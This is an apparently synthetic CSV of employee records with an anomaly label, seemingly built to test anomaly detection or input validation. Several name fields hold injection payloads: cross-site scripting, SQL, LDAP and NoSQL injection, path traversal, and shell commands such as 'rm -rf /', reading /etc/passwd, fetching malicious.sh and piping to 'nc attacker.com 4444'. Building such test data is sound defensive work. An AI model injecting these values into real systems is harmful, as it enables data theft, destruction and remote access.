employee_id,name,age,salary,years_experience,department,location,performance_score,projects_completed,days_absent,is_anomaly
EMP01336,Jane Garcia,28,98789,9,Finance,Berlin,7.0,18,5,0
EMP01368,<script>alert('XSS')</script>,35,86895,7,Marketing,New York,6.7,18,7,1
EMP01446,Charlie Johnson,37,75681,8,Operations,Singapore,6.6,11,4,0
EMP01333,Charlie Garcia,29,84070,7,Engineering,Singapore,6.2,11,5,0
EMP01198,Charlie Williams,35,63576,12,Engineering,New York,9.3,17,4,0
EMP01168,*)(uid=*,33,74196,8,Finance,San Francisco,8.8,15,7,1
EMP01481,Jane Williams,27,71950,10,HR,San Francisco,4.3,10,3,0
EMP01723,Charlie Williams,40,55811,14,Operations,Tokyo,7.0,15,4,0
EMP01655,Jane Smith,35,40000,9,HR,Singapore,6.2,9,7,0
EMP01306,Alice Jones,45,87255,1,Engineering,London,7.7,0,6,0
EMP01231,John Williams,36,15000,8,HR,San Francisco,8.2,12,4,1
EMP01422,John Brown,33,87675,13,HR,Berlin,7.4,14,8,0
EMP01049,Bob Williams,22,64380,18,Operations,Tokyo,6.5,9,4,1
EMP01787,{'$gt': ''},38,67659,4,Sales,Singapore,8.8,12,6,0
EMP01357,Charlie Garcia,32,120048,20,Engineering,New York,6.4,7,7,0
EMP01086,John Garcia,42,86678,6,Operations,Berlin,6.9,14,8,0
EMP01545,John Smith,28,45302,13,Finance,London,5.8,16,5,0
EMP01192,Alice Brown,36,70056,7,Marketing,Tokyo,7.4,9,2,0
EMP01795,Jane Williams,43,54805,2,HR,New York,4.7,12,4,0
EMP01033,Diana Smith,25,59644,25,Engineering,Tokyo,7.2,1,5,0
EMP01031,Charlie Williams,22,56626,30,Operations,Berlin,6.0,10,3,1
EMP01199,Jane Williams,25,-5000,8,Finance,Singapore,6.8,9,4,1
EMP01365,Jane Brown,31,123795,8,Operations,London,8.7,8,5,0
EMP01486,John Smith,29,40000,5,Finance,New York,6.7,6,90,1
EMP01594,; whoami,43,67693,8,Engineering,San Francisco,6.1,6,5,1
EMP01568,Bob Jones,22,66134,7,HR,San Francisco,4.8,8,4,0
EMP01428,Alice Jones,43,94277,8,Finance,Berlin,8.9,9,5,0
EMP01137,Alice Brown,32,89167,3,Finance,Singapore,8.9,7,10,1
EMP01072,Jane Garcia,34,47413,6,HR,London,6.3,10,8,0
EMP01077,Bob Jones,32,79475,14,Finance,New York,9.7,15,6,0
EMP01512,' UNION SELECT * FROM passwords--,33,102804,8,Engineering,Berlin,6.4,17,2,1
EMP01783,Charlie Smith,39,76233,7,Marketing,Singapore,7.0,9,1,1
EMP01786,Bob Garcia,41,78528,7,Sales,New York,5.7,15,5,0
EMP01275,John Jones,38,65124,13,Finance,Berlin,4.6,14,3,0
EMP01361,Alice Brown,47,120818,9,Operations,Berlin,6.3,17,6,0
EMP01096,Charlie Williams,37,71657,3,Engineering,New York,7.1,12,5,0
EMP01641,Jane Garcia,48,98469,10,HR,San Francisco,7.7,16,6,0
EMP01715,Bob Williams,43,72565,9,Sales,Tokyo,7.9,6,7,0
EMP01281,Diana Williams,40,-5000,14,Operations,Berlin,7.0,1,2,1
EMP01393,Jane Smith,49,153890,0,Engineering,London,6.1,16,9,1
EMP01628,Jane Smith,35,70574,0,Engineering,New York,6.7,15,6,0
EMP01608,`cat /etc/passwd`,22,68546,6,Finance,London,9.1,13,7,1
EMP01705,Alice Garcia,39,65935,20,Sales,Tokyo,8.0,7,3,0
EMP01754,John Garcia,27,70470,12,HR,Tokyo,5.9,13,6,0
EMP01054,John Williams,24,103410,25,Finance,London,8.5,11,6,1
EMP01750,Diana Williams,27,72996,12,Sales,Tokyo,8.8,14,11,1
EMP01155,Jane Brown,29,97345,13,Finance,Singapore,8.3,16,4,0
EMP01432,Alice Williams,32,73234,9,Marketing,New York,9.8,12,4,0
EMP01097,Bob Smith,37,77934,5,Sales,New York,7.1,50,5,0
EMP01120,Charlie Johnson,41,96472,10,Marketing,Berlin,7.8,9,4,0
EMP01076,Bob Jones,35,64647,12,Sales,New York,7.2,14,60,1
EMP01204,Alice Jones,23,88964,0,Finance,Singapore,6.6,19,8,0
EMP01352,Bob Brown,41,62220,4,Operations,Berlin,6.8,7,5,0
EMP01764,| nc attacker.com 4444,44,89736,5,Sales,San Francisco,5.8,12,2,1
EMP01208,Diana Smith,39,95991,1,Finance,Singapore,8.8,12,6,0
EMP01367,Bob Brown,35,157693,1,Operations,Singapore,8.2,14,3,1
EMP01425,{'$ne': null},45,-5000,8,HR,London,10.0,13,4,1
EMP01515,John Johnson,41,48763,5,Marketing,New York,10.0,11,6,0
EMP01084,Alice Brown,82,-100,3,Engineering,London,6.7,11,4,1
EMP01010,admin'--,31,71262,6,Operations,Singapore,8.7,15,4,1
EMP01720,John Garcia,37,99420,9,HR,San Francisco,6.8,21,9,1
EMP01110,Charlie Garcia,22,68844,12,Sales,Berlin,8.2,11,6,0
EMP01521,Diana Williams,39,85593,11,Operations,Singapore,8.6,10,4,0
EMP01777,John Garcia,33,500000,2,Sales,San Francisco,6.7,9,6,1
EMP01209,Jane Williams,65,64295,11,Engineering,Tokyo,9.4,11,3,1
EMP01235,Alice Williams,40,106479,9,Sales,Tokyo,9.1,12,60,1
EMP01316,Bob Garcia,40,123068,4,Marketing,San Francisco,8.4,9,8,0
EMP01388,Charlie Smith,42,86001,5,Engineering,Berlin,6.8,1,3,0
EMP01118,admin)(|(password=*)),44,66071,10,Operations,San Francisco,7.2,13,4,0
EMP01719,Diana Williams,34,112081,3,Operations,London,10.0,0,8,0
EMP01210,John Smith,39,101347,6,Sales,San Francisco,8.5,15,3,0
EMP01254,<script>alert('XSS')</script>,22,63993,12,Operations,Singapore,6.5,15,5,1
EMP01591,Charlie Garcia,31,61445,9,Marketing,New York,8.4,9,3,0
EMP01029,John Jones,32,69364,11,HR,Tokyo,7.0,10,3,0
EMP01266,John Smith,48,49106,12,HR,London,8.8,11,5,0
EMP01656,Charlie Brown,35,90066,11,Marketing,San Francisco,6.7,13,1,1
EMP01662,'; DROP TABLE users--,34,70819,12,Marketing,Berlin,7.4,21,0,1
EMP01296,John Williams,42,76572,6,HR,New York,9.1,15,7,0
EMP01081,Diana Jones,37,64382,7,Operations,Tokyo,10.0,10,6,0
EMP01688,Alice Garcia,40,44486,5,HR,New York,4.6,14,2,0
EMP01302,<svg onload=alert('XSS')>,40,116767,12,Finance,Tokyo,10.0,19,9,1
EMP01506,Bob Williams,30,196140,1,Sales,London,6.9,16,8,1
EMP01758,{'$gt': ''},28,104853,0,Finance,London,9.5,12,6,0
EMP01314,Bob Jones,45,78008,0,Finance,Singapore,8.1,13,7,0
EMP01644,Diana Smith,33,82993,14,Operations,San Francisco,8.6,13,1,1
EMP01409,$(wget malicious.sh),39,109991,11,Finance,San Francisco,6.7,5,4,1
EMP01211,' UNION SELECT * FROM passwords--,44,78951,8,Finance,Singapore,5.8,11,5,1
EMP01532,Jane Williams,34,70731,10,Operations,Berlin,6.2,10,8,0
EMP01483,Charlie Williams,36,94134,0,Operations,London,8.2,8,2,0
EMP01218,Bob Williams,31,68593,7,Operations,San Francisco,8.2,10,4,0
EMP01007,Charlie Brown,41,65425,14,Operations,Berlin,8.7,13,5,0
EMP01464,Bob Williams,34,78387,9,Finance,Berlin,8.1,10,6,0
EMP01101,Charlie Smith,31,67133,9,Finance,San Francisco,9.0,16,0,1
EMP01326,1'; DELETE FROM employees WHERE '1'='1,44,81052,0,Marketing,London,9.0,15,7,1
EMP01652,Charlie Brown,32,79815,2,Operations,Tokyo,7.1,50,5,0
EMP01537,Alice Garcia,31,68950,14,Engineering,Tokyo,7.2,11,8,0
EMP01640,Diana Williams,32,88257,8,Finance,Tokyo,8.4,8,6,0
EMP01002,Alice Johnson,40,76922,5,Finance,London,6.7,16,5,0
EMP01738,Bob Jones,48,51601,8,Engineering,San Francisco,8.2,12,3,0
EMP01776,Bob Jones,29,42697,6,Marketing,Berlin,5.3,10,6,0
EMP01519,Alice Smith,41,71260,7,Marketing,Berlin,9.4,14,7,0
EMP01589,<iframe src='malicious.com'>,28,59931,10,Marketing,San Francisco,10.0,10,4,1
EMP01798,Diana Williams,35,75415,8,Marketing,Tokyo,6.9,8,4,0
EMP01744,John Garcia,39,62955,0,HR,Tokyo,8.1,7,6,0
EMP01513,Jane Johnson,27,86156,3,Finance,San Francisco,8.6,14,4,0
EMP01670,Diana Williams,44,98932,9,HR,New York,5.6,16,7,0
EMP01264,' UNION SELECT * FROM passwords--,32,67751,13,Finance,San Francisco,8.2,11,4,1
EMP01615,John Williams,36,93556,9,HR,Tokyo,9.1,13,6,0
EMP01329,Jane Brown,40,81575,15,Operations,New York,6.8,10,5,0
EMP01342,Alice Brown,36,71998,9,Sales,London,7.6,11,4,0
EMP01394,Charlie Johnson,44,43140,9,Operations,Singapore,7.5,8,3,0
EMP01079,John Garcia,22,98767,6,Marketing,Tokyo,8.5,9,5,0
EMP01148,Jane Williams,39,74088,8,Marketing,Singapore,9.0,9,8,0
EMP01350,Jane Garcia,37,55172,0,Operations,Singapore,10.0,12,2,0
EMP01382,Jane Brown,22,93366,5,Sales,London,5.7,13,60,1
EMP01440,<img src=x onerror=alert(1)>,38,67417,5,Engineering,London,7.9,50,4,1
EMP01309,John Johnson,33,113280,8,Sales,London,9.8,10,5,0
EMP01707,admin)(|(password=*)),49,94106,7,HR,Singapore,8.4,9,5,0
EMP01133,Jane Brown,38,40000,6,Finance,New York,6.1,13,5,0
EMP01381,Bob Williams,30,102840,2,Finance,New York,6.5,11,12,1
EMP01213,Alice Jones,40,61216,11,Finance,Berlin,7.5,16,6,0
EMP01659,Charlie Johnson,33,88463,8,Sales,London,6.9,13,6,0
EMP01055,Bob Williams,42,63585,6,Operations,Singapore,9.7,14,4,0
EMP01736,Diana Garcia,37,85272,10,Marketing,London,8.9,12,4,0
EMP01620,Bob Smith,28,85765,6,Finance,Singapore,9.3,14,8,0
EMP01582,Jane Garcia,40,118146,7,HR,Singapore,8.6,14,7,0
EMP01673,<script>alert('XSS')</script>,32,500000,8,Marketing,Berlin,9.9,13,3,1
EMP01527,Bob Smith,35,72118,12,HR,Tokyo,7.8,14,4,0
EMP01196,John Smith,27,110953,6,Finance,Berlin,6.6,0,4,0
EMP01713,`cat /etc/passwd`,38,40000,9,Engineering,Singapore,5.7,0,6,1
EMP01689,Diana Garcia,38,100251,13,Operations,San Francisco,7.7,16,6,0
EMP01060,Bob Garcia,31,79058,13,HR,Berlin,7.6,13,5,0
EMP01576,; whoami,36,61618,1,Sales,Singapore,9.4,7,8,1
EMP01631,Diana Brown,47,91314,11,Operations,Berlin,6.5,13,4,0
EMP01431,Diana Jones,22,47603,4,Finance,Berlin,6.1,17,4,0
EMP01603,Diana Williams,45,89379,2,Engineering,Singapore,10.0,8,0,1
EMP01442,Alice Williams,22,63366,5,Finance,New York,9.7,17,2,0
EMP01436,Charlie Jones,48,108554,9,Sales,Tokyo,10.0,10,10,1
EMP01247,Diana Garcia,29,43472,4,Finance,Singapore,5.4,11,7,0
EMP01586,John Johnson,31,101034,2,Engineering,Berlin,7.3,18,7,0
EMP01569,John Garcia,32,57303,9,Operations,London,7.9,12,6,0
EMP01090,Diana Williams,35,91409,10,Sales,Tokyo,7.5,7,3,0
EMP01650,Alice Brown,49,81176,7,Engineering,New York,5.4,13,7,0
EMP01181,Charlie Jones,28,83509,7,Engineering,Singapore,8.1,8,3,0
EMP01790,$(wget malicious.sh),38,53557,0,Sales,Singapore,6.9,12,5,1
EMP01554,Charlie Brown,37,63469,2,Engineering,New York,6.1,10,9,1
EMP01290,Jane Brown,33,73567,10,Operations,London,6.0,17,2,0
EMP01158,John Johnson,25,86395,14,Engineering,New York,8.0,11,4,0
EMP01069,Jane Jones,29,115204,10,Engineering,San Francisco,7.2,14,3,0
EMP01517,Bob Garcia,27,0,4,Operations,Tokyo,8.5,10,7,1
EMP01131,Diana Jones,35,112623,6,Finance,Singapore,6.1,7,3,0
EMP01044,Diana Smith,23,78329,3,Engineering,Tokyo,6.7,12,8,0
EMP01070,Bob Smith,37,71461,7,HR,Tokyo,9.1,10,6,0
EMP01691,Diana Smith,44,126163,11,Sales,Berlin,8.6,13,2,0
EMP01355,John Johnson,26,95196,13,Marketing,Tokyo,6.8,14,4,0
EMP01444,Diana Williams,24,62014,4,Marketing,London,7.8,0,5,0
EMP01761,Charlie Johnson,35,60055,2,Finance,Berlin,8.2,11,4,0
EMP01135,John Smith,47,64958,1,Marketing,Singapore,7.1,10,5,0
EMP01082,Alice Garcia,46,65211,4,Operations,San Francisco,10.0,8,60,1
EMP01165,Bob Johnson,38,103802,4,HR,San Francisco,6.9,8,2,0
EMP01164,Diana Garcia,42,73205,7,HR,Tokyo,6.2,13,7,0
EMP01028,John Brown,30,66596,8,HR,Singapore,9.2,8,5,0
EMP01448,..\..\windows\system32,30,79675,6,Engineering,San Francisco,6.6,10,6,0
EMP01193,Alice Smith,25,61360,10,Finance,Singapore,7.6,11,4,0
EMP01239,John Williams,41,95941,7,Sales,Berlin,8.1,10,6,0
EMP01724,Charlie Johnson,36,67555,7,Engineering,New York,7.3,10,5,0
EMP01730,John Smith,36,77817,6,Operations,London,7.4,10,3,0
EMP01136,Diana Brown,28,54575,3,Finance,Tokyo,9.0,8,3,0
EMP01664,Bob Williams,29,63389,10,Finance,Tokyo,5.2,11,2,0
EMP01311,Jane Johnson,43,79348,16,Sales,New York,9.8,11,6,0
EMP01140,Diana Garcia,36,49393,7,Marketing,Berlin,6.4,11,4,0
EMP01473,Alice Garcia,45,68671,8,HR,Singapore,6.6,10,4,0
EMP01006,Charlie Smith,47,79442,8,Engineering,Singapore,5.6,10,8,0
EMP01728,Diana Brown,30,65223,10,HR,San Francisco,7.6,17,6,0
EMP01755,Jane Garcia,56,82347,9,Finance,Tokyo,5.1,11,6,1
EMP01073,Jane Garcia,47,60381,4,Engineering,Tokyo,5.4,12,3,0
EMP01559,Diana Smith,31,78667,10,Operations,Berlin,5.8,7,6,0
EMP01299,Charlie Garcia,40,0,6,Marketing,Berlin,9.5,11,1,1
EMP01145,1'; DELETE FROM employees WHERE '1'='1,41,53598,8,HR,Tokyo,8.1,10,4,1
EMP01292,Diana Garcia,30,89552,6,Finance,London,7.4,11,2,0
EMP01234,Jane Smith,52,65336,5,Sales,Singapore,10.0,8,5,0
EMP01220,Diana Brown,53,85456,7,Sales,Singapore,8.6,8,6,1
EMP01450,Jane Garcia,34,81617,11,Engineering,Tokyo,6.7,11,5,0
EMP01380,John Williams,28,78597,4,HR,San Francisco,8.8,11,3,0
EMP01132,Charlie Brown,26,46039,7,Operations,London,8.3,8,5,0
EMP01375,Charlie Jones,28,69386,6,Engineering,Tokyo,7.1,8,3,0
EMP01404,Alice Smith,31,75977,0,Marketing,New York,7.4,11,2,0
EMP01522,<script>alert('XSS')</script>,29,73590,7,Sales,New York,7.2,12,8,1
EMP01749,Alice Jones,23,99538,6,Marketing,London,6.2,17,3,0
EMP01426,Jane Garcia,27,75876,15,Operations,Berlin,9.4,10,2,0
EMP01041,Alice Johnson,36,88496,13,HR,Berlin,9.6,7,5,0
EMP01495,Diana Garcia,39,73022,7,Marketing,New York,10.0,10,6,0
EMP01108,<iframe src='malicious.com'>,37,87909,7,Operations,Tokyo,5.5,11,4,1
EMP01344,Alice Johnson,31,71538,10,Engineering,Berlin,4.0,8,3,0
EMP01056,John Johnson,28,58352,8,Engineering,San Francisco,6.6,7,2,0
EMP01259,Alice Williams,41,67587,9,HR,Berlin,8.3,10,8,0
EMP01479,Alice Smith,43,68817,6,Sales,Singapore,7.2,11,2,0
EMP01625,Bob Smith,30,40000,13,Marketing,Tokyo,6.9,8,7,0
EMP01227,*)(uid=*,26,77400,13,Marketing,Tokyo,8.5,16,4,1
EMP01212,Jane Williams,42,116505,14,Marketing,Berlin,7.2,1,5,0
EMP01593,Bob Brown,37,77730,2,HR,Tokyo,7.2,11,6,0
EMP01332,Alice Brown,35,107274,6,HR,New York,8.3,12,6,0
EMP01024,Alice Williams,30,66089,15,HR,Singapore,5.2,13,7,0
EMP01780,Charlie Jones,36,79011,4,Marketing,San Francisco,9.0,7,4,0
EMP01351,javascript:alert('Hacked'),46,40000,13,Operations,Berlin,9.9,9,5,1
EMP01356,; rm -rf /,34,61236,0,Operations,San Francisco,7.8,10,9,1
EMP01051,Charlie Johnson,31,63890,9,Finance,Tokyo,6.3,11,8,0
EMP01331,Charlie Jones,27,83438,9,Engineering,San Francisco,10.0,4,7,0
EMP01733,Jane Jones,22,72047,6,Operations,Singapore,9.7,13,2,0
EMP01629,Bob Williams,43,69463,12,Engineering,London,7.6,11,4,0
EMP01501,Charlie Jones,50,94840,4,HR,Singapore,6.9,15,4,0
EMP01334,Charlie Brown,42,70116,18,Marketing,San Francisco,10.0,21,0,1
EMP01285,Charlie Williams,22,83600,9,Marketing,Singapore,8.0,8,5,0
EMP01018,Jane Garcia,27,76645,6,HR,Singapore,8.1,9,4,0
EMP01584,Charlie Smith,36,89841,0,Engineering,Tokyo,5.0,12,2,0
EMP01748,John Garcia,30,90321,10,Finance,London,7.3,6,5,0
EMP01083,Alice Smith,30,95883,9,Marketing,San Francisco,6.4,10,7,0
EMP01061,Bob Johnson,33,44685,7,Engineering,London,8.6,11,3,0
EMP01462,Charlie Williams,29,85775,9,Finance,San Francisco,5.8,9,4,0
EMP01291,Diana Brown,31,74255,8,Engineering,San Francisco,7.1,10,5,0
EMP01447,John Johnson,27,59600,7,Marketing,San Francisco,6.2,9,3,0
EMP01182,John Jones,26,55660,1,Finance,Tokyo,7.4,16,7,0
EMP01549,*)(uid=*,30,70504,1,HR,Tokyo,5.1,13,3,1
EMP01500,Charlie Brown,23,61638,30,Engineering,Tokyo,7.4,13,5,1
EMP01223,Jane Garcia,22,117845,5,Engineering,San Francisco,9.6,13,6,0
EMP01424,Bob Garcia,40,71294,0,Sales,New York,7.4,12,4,0
EMP01467,Diana Johnson,41,56921,7,Sales,Singapore,6.2,10,4,0
EMP01319,' UNION SELECT * FROM passwords--,33,96013,6,HR,Singapore,7.7,10,4,1
EMP01328,John Brown,39,73717,12,Operations,Tokyo,6.4,12,7,0
EMP01443,Alice Jones,34,54704,8,HR,Berlin,5.7,19,3,0
EMP01493,Bob Brown,28,91769,3,Sales,Singapore,7.8,21,4,0
EMP01176,Jane Smith,35,65953,5,Sales,London,9.7,12,4,0
EMP01676,Charlie Williams,26,72581,10,Sales,New York,8.7,15,7,0
EMP01363,`cat /etc/passwd`,38,42092,10,Sales,New York,6.6,8,4,1
EMP01163,Diana Jones,28,89180,1,HR,Singapore,7.9,11,8,0
EMP01248,Jane Williams,49,104530,11,Finance,Tokyo,7.5,10,8,0
EMP01518,Charlie Brown,35,62809,0,Marketing,London,7.6,10,9,1
EMP01710,Diana Brown,36,52166,6,Sales,London,5.8,12,5,0
EMP01074,Bob Jones,22,74337,14,HR,San Francisco,8.0,14,6,0
EMP01643,John Garcia,22,49063,1,Engineering,Tokyo,7.8,14,6,0
EMP01405,Charlie Smith,39,75811,8,Sales,Tokyo,4.8,13,5,0
EMP01104,Charlie Johnson,33,78821,9,Operations,London,5.9,14,4,0
EMP01114,Diana Williams,33,73094,5,HR,Singapore,7.3,16,6,0
EMP01300,Alice Brown,28,94960,10,Sales,London,8.1,10,3,0
EMP01092,Charlie Johnson,29,96333,11,Operations,Tokyo,6.8,9,8,0
EMP01411,Diana Johnson,26,61141,4,Operations,London,6.5,12,4,0
EMP01089,Charlie Smith,39,97174,6,Engineering,San Francisco,4.6,11,5,0
EMP01528,*)(uid=*,37,50806,10,Sales,San Francisco,9.9,13,7,1
EMP01734,Jane Brown,43,65679,11,Sales,Berlin,7.6,21,5,0
EMP01743,Bob Williams,35,65858,5,Engineering,San Francisco,6.6,11,4,0
EMP01575,Bob Smith,22,0,16,Operations,Tokyo,7.7,19,3,1
EMP01497,Jane Jones,33,69194,3,Marketing,San Francisco,10.0,16,8,0
EMP01494,{'$ne': null},47,76636,12,Sales,Tokyo,8.3,11,3,0
EMP01011,Charlie Smith,31,66205,1,Marketing,San Francisco,9.8,14,4,0
EMP01433,Jane Smith,40,126594,10,Marketing,Tokyo,7.1,11,1,1
EMP01043,Diana Garcia,32,82648,9,Marketing,London,8.5,1,2,0
EMP01042,Diana Williams,34,52545,7,Sales,Tokyo,5.6,14,7,0
EMP01167,Jane Smith,50,111018,7,Engineering,Singapore,8.5,9,6,0
EMP01703,Alice Johnson,23,74932,9,Operations,London,9.1,13,7,0
EMP01613,Charlie Brown,25,118300,6,Operations,Singapore,5.4,8,6,0
EMP01412,John Garcia,22,60631,4,Operations,San Francisco,10.0,10,4,0
EMP01178,<script>alert('XSS')</script>,32,43321,6,Marketing,London,7.9,8,8,1
EMP01530,Alice Johnson,40,105615,9,Finance,Berlin,8.8,12,6,0
EMP01539,Charlie Jones,30,15000,2,Marketing,New York,6.9,5,7,1
EMP01177,Charlie Smith,46,40000,7,Marketing,Singapore,9.0,15,5,0
EMP01665,Diana Jones,35,86771,12,Engineering,London,8.0,100,5,0
EMP01766,Jane Johnson,34,76339,5,Operations,Berlin,6.9,20,4,0
EMP01257,Bob Williams,29,98454,6,HR,Berlin,8.8,12,5,0
EMP01765,John Williams,29,69373,14,HR,Singapore,4.9,7,7,0
EMP01543,Diana Williams,46,98812,8,Engineering,San Francisco,7.2,10,7,0
EMP01015,Bob Johnson,30,45288,20,Finance,Berlin,7.9,16,3,0
EMP01003,Jane Johnson,47,65754,4,Marketing,Singapore,7.1,10,3,0
EMP01335,Charlie Brown,33,94281,1,Operations,Tokyo,6.7,12,7,0
EMP01256,Diana Johnson,45,74488,13,Marketing,Berlin,5.9,9,8,0
EMP01580,John Smith,37,88558,7,Finance,New York,7.9,50,3,0
EMP01445,Charlie Smith,40,50521,12,Engineering,London,5.9,11,3,0
EMP01338,Alice Johnson,38,86948,12,HR,Tokyo,9.8,16,6,0
EMP01478,Alice Johnson,59,78840,7,Sales,San Francisco,7.9,15,7,1
EMP01417,Bob Garcia,35,80579,0,Operations,Tokyo,8.1,13,6,0
EMP01638,Charlie Smith,24,84819,6,Sales,San Francisco,6.1,15,6,0
EMP01714,Charlie Smith,18,73346,10,Finance,Tokyo,8.1,15,5,0
EMP01324,Jane Johnson,26,107668,16,HR,New York,10.0,18,5,0
EMP01457,Alice Garcia,26,83380,11,Engineering,Berlin,7.2,14,5,0
EMP01009,John Johnson,39,198340,0,Operations,Singapore,5.8,50,4,1
EMP01249,<script>alert('XSS')</script>,38,102601,9,Marketing,London,8.9,100,6,1
EMP01022,John Smith,35,120977,11,Operations,New York,7.2,21,4,0
EMP01221,Alice Smith,22,63525,8,HR,Berlin,8.7,19,8,0
EMP01547,Charlie Jones,33,93686,4,Operations,San Francisco,4.0,9,6,0
EMP01690,Diana Johnson,32,63962,14,HR,San Francisco,4.8,9,90,1
EMP01784,Diana Garcia,39,83576,8,Sales,Tokyo,6.3,9,6,0
EMP01626,Diana Johnson,27,116124,13,HR,Singapore,7.8,9,6,0
EMP01340,Charlie Brown,28,69048,9,Operations,San Francisco,8.1,11,4,0
EMP01671,Bob Williams,22,62804,6,HR,London,10.0,14,7,0
EMP01203,Charlie Garcia,43,62061,1,Marketing,Singapore,5.7,11,6,0
EMP01237,Jane Garcia,36,45712,8,Sales,Berlin,8.9,7,9,1
EMP01093,Jane Williams,32,98385,2,HR,Tokyo,9.7,12,6,0
